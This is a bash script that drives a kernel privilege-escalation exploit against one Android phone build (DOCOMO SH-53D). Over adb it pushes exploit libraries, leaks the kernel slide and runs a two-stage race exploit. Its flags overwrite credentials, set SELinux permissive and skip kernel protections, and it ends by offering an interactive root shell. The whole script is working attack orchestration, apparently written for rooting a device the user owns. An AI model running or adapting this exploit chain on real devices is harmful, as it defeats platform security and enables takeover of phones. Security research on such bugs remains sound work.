#!/usr/bin/env bash
set -euo pipefail

readonly EXPECTED_FINGERPRINT='DOCOMO/SH-53D/SH-53D:13/TP1A.220624.014/38JP_1_30I:user/release-keys'
readonly REMOTE_DIR='/data/local/tmp'
readonly SLIDE_LOG="$REMOTE_DIR/sh53d-slide.log"
readonly ROOT_LOG="$REMOTE_DIR/sh53d-root.log"

command -v adb >/dev/null || { echo 'adb was not found.' >&2; exit 1; }
[[ -f dist/sh53d-slide.so && -f dist/sh53d-exploit.so &&
   -f dist/sh53d-root && -f dist/sh53d-launcher.so ]] || {
  echo 'Build first with ./build.sh.' >&2
  exit 1
}

device_count=$(adb devices | awk 'NR > 1 && $2 == "device" { count++ } END { print count + 0 }')
[[ "$device_count" == 1 ]] || {
  echo "Exactly one authorized adb device is required (found $device_count)." >&2
  exit 1
}

fingerprint=$(adb shell getprop ro.build.fingerprint | tr -d '\r')
[[ "$fingerprint" == "$EXPECTED_FINGERPRINT" ]] || {
  echo "Unsupported build: $fingerprint" >&2
  echo "Expected: $EXPECTED_FINGERPRINT" >&2
  exit 1
}

echo '[1/5] Waiting for the authorized device.'
adb wait-for-device
until [[ "$(adb shell getprop sys.boot_completed 2>/dev/null | tr -d '\r')" == 1 ]]; do
  sleep 2
done

echo '[2/5] Installing temporary files.'
adb push dist/sh53d-slide.so "$REMOTE_DIR/sh53d-slide.so" >/dev/null
adb push dist/sh53d-exploit.so "$REMOTE_DIR/sh53d-exploit.so" >/dev/null
adb push dist/sh53d-root "$REMOTE_DIR/sh53d-root" >/dev/null
adb push dist/sh53d-launcher.so "$REMOTE_DIR/sh53d-launcher.so" >/dev/null
adb shell chmod 0755 "$REMOTE_DIR/sh53d-root"

echo '[3/5] Resolving the per-boot kernel slide.'
adb shell env \
  SLIDE_ONLY=1 RMG_KSNITCH_REPEAT=8 RMG_KSNITCH_AVERAGE=1 \
  "$REMOTE_DIR/sh53d-root" --run-payload \
  "$REMOTE_DIR/sh53d-slide.so" "$REMOTE_DIR/sh53d-root" "$SLIDE_LOG"
slide=$(adb shell cat "$SLIDE_LOG" | tr -d '\r' |
  grep -Eo 'candidate=[0-9a-fA-F]+' | tail -1 | cut -d= -f2)
[[ "$slide" =~ ^[0-9a-fA-F]{16}$ ]] || {
  echo 'Could not obtain a unique kernel slide. Device log:' >&2
  adb shell cat "$SLIDE_LOG" >&2
  exit 1
}
echo "Resolved P0 offset: 0x$slide"

echo '[4/5] Running the two-stage exploit. A failed race can reboot the device.'
adb shell env \
  "SLIDE_P0_OFFSET=0x$slide" \
  "OLD_FILETARGET_PAYLOAD=$REMOTE_DIR/sh53d-exploit.so" \
  PSELECT_FAKE_FOPS_NULL_MMAP_DIAG=1 \
  PSELECT_TWO_STAGE_SPLICE=1 \
  ROOT_USE_DIRECT_CRED_RUNTIME=1 \
  ROOT_DIRECT_USABLE_ROOT=1 \
  ROOT_DIRECT_SELINUX_PERMISSIVE=1 \
  ROOT_SKIP_KDP=1 \
  PSELECT_M53_WRITE_ONLY_CFI=0 \
  PSELECT_DELAY_USEC=5000 \
  PSELECT_SUPERVISOR_FIXED_DELAY_RUNTIME=1 \
  RMG_KSNITCH_REPEAT=8 \
  RMG_KSNITCH_AVERAGE=1 \
  EXPLOIT_RETRY_DELAY_SEC=0 \
  EXPLOIT_ATTEMPTS=12 \
  EXPLOIT_ATTEMPT_TIMEOUT_SEC=180 \
  "$REMOTE_DIR/sh53d-root" --run-payload \
  "$REMOTE_DIR/sh53d-launcher.so" "$REMOTE_DIR/sh53d-root" "$ROOT_LOG"

adb shell cat "$ROOT_LOG" | tr -d '\r' |
  grep -F 'root permissive daemon enforcing=0 ready=1' >/dev/null || {
  echo "Exploit did not produce a verified root daemon. See $ROOT_LOG" >&2
  exit 1
}

echo '[5/5] Verifying credentials and SELinux state.'
adb shell "$REMOTE_DIR/sh53d-root" -c \
  'id; getenforce; cat /proc/self/attr/current'
echo
echo "Temporary root is ready. Interactive shell:"
echo "  adb shell -t $REMOTE_DIR/sh53d-root"
echo 'A normal reboot restores SELinux enforcing and removes the root daemon.'
